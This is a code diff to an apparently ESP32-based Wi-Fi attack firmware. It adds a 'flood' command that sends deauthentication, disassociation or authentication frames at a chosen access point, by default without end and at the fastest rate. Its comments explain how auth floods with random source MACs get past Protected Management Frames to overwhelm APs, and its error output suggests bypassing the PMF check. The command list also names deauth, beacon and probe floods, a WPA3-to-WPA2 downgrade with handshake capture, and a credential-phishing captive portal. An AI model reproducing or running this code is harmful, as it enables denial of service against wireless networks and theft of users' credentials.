@@ -380,6 +380,81 @@ static int cmd_probeflood(int argc, char **argv)
     return 0;
 }
 
+/* flood: 对目标 AP 持续发送指定类型管理帧 (deauth/disassoc/auth).
+ *   - auth 不是被保护管理帧, PMF 也照收; 每帧随机源 MAC 逼迫 AP 反复分配关联态,
+ *     是真正能压垮脆弱 AP 的向量, 因此 auth 模式跳过 PMF 拦截.
+ *   - deauth/disassoc 对 PMF AP 无效, 沿用与 deauth 相同的 PMF 感知 (MFPR=1 拦截,
+ *     除非 --force). */
+static struct {
+    arg_str_t *bssid;
+    arg_str_t *type;
+    arg_str_t *station;
+    arg_int_t *count;
+    arg_int_t *interval;
+    arg_end_t *end;
+} flood_args;
+
+static void flood_arg_reset(void)
+{
+    if (flood_args.bssid) arg_freetable((void **)&flood_args.bssid, 5);
+    flood_args.bssid    = arg_str1("b", "bssid", "<mac>",   "target AP MAC");
+    flood_args.type     = arg_str0("t", "type", "<deauth|disassoc|auth>", "frame type (default deauth)");
+    flood_args.station  = arg_str0("s", "station", "<mac>", "target STA (omit=broadcast)");
+    flood_args.count    = arg_int0("n", "count", "<n>",    "frames (0=forever)");
+    flood_args.interval = arg_int0("i", "interval", "<ms>", "interval ms (default 0=fastest)");
+    flood_args.end      = arg_end(6);
+}
+
+static int cmd_flood(int argc, char **argv)
+{
+    if (!confirm_dangerous(argc, argv, "-b <bssid>")) return 1;
+    int nerrors = arg_parse(argc, argv, (void **)&flood_args);
+    if (nerrors) { meta_arg_errors(flood_args.end, argv[0]); return 1; }
+
+    const char *ts = flood_args.type->count ? flood_args.type->sval[0] : "deauth";
+    int ftype;
+    if (strcmp(ts, "auth") == 0)         ftype = WIFI_FLOOD_AUTH;
+    else if (strcmp(ts, "disassoc") == 0) ftype = WIFI_FLOOD_DISASSOC;
+    else if (strcmp(ts, "deauth") == 0)   ftype = WIFI_FLOOD_DEAUTH;
+    else {
+        printf("META,WIFI,ERR,msg,bad_type (want deauth|disassoc|auth)\n"); fflush(stdout); return 1;
+    }
+
+    uint8_t b[6], s[6] = {0};
+    if (!parse_mac(flood_args.bssid->sval[0], b)) {
+        printf("META,WIFI,ERR,msg,bad_bssid\n"); fflush(stdout); return 1;
+    }
+
+    /* PMF 拦截只针对被保护的管理帧 (deauth/disassoc); auth 不受 PMF 影响, 跳过. */
+    if (ftype != WIFI_FLOOD_AUTH && !g_force) {
+        char ms[18]; mac_to_str(b, ms);
+        const ap_entry_t *ap = wifi_db_find_ap(b);
+        if (!ap) {
+            printf("META,WIFI,PMF,UNKNOWN,bssid,%s,reason,not_in_db,"
+                   "advice,sniff first or add --force\n", ms);
+            fflush(stdout); return 1;
+        }
+        if (ap->pmf) {
+            printf("META,WIFI,PMF,BLOCKED,bssid,%s,reason,mfpr,"
+                   "advice,use --force or switch to -t auth (auth is not PMF-protected)\n", ms);
+            fflush(stdout); return 1;
+        }
+    }
+
+    if (flood_args.station->count) {
+        if (!parse_mac(flood_args.station->sval[0], s)) {
+            printf("META,WIFI,ERR,msg,bad_station\n"); fflush(stdout); return 1;
+        }
+    }
+    uint32_t cnt  = flood_args.count->count ? (uint32_t)flood_args.count->ival[0] : 0;
+    uint32_t intv = flood_args.interval->count ? (uint32_t)flood_args.interval->ival[0] : 0;
+    esp_err_t e = wifi_attack_flood_start(b, s, ftype, cnt, intv);
+    if (e != ESP_OK) {
+        printf("META,WIFI,ERR,code,%d,msg,flood_start_failed\n", e); fflush(stdout); return 1;
+    }
+    return 0;
+}
+
 
 static struct {
     arg_str_t *subcmd;
@@ -2267,6 +2342,7 @@ static const cli_cmd_t g_cmds[] = {
     { "deauth",      "Deauth inject",        "-b <bssid> [opts]",    cmd_deauth,      deauth_arg_reset },
     { "beaconflood", "Beacon flood",         "-p <prefix> [opts]",   cmd_beaconflood, beacon_arg_reset },
     { "probeflood",  "Probe req flood",      "[opts]",               cmd_probeflood,  probe_arg_reset },
+    { "flood",       "Flood AP (deauth/disassoc/auth)", "-b <bssid> -t <type> [opts]", cmd_flood, flood_arg_reset },
     { "http",        "HTTP REST API",        "<start|stop|status>",  cmd_http,        http_arg_reset },
     { "downgrade",   "WPA3->WPA2 downgrade AP + EAPOL capture", "<ssid> [opts]|list", cmd_downgrade, downgrade_arg_reset },
     { "phish",       "Captive portal (phishing AP)", "start|stop|status|stations|creds|html", cmd_phish, NULL },
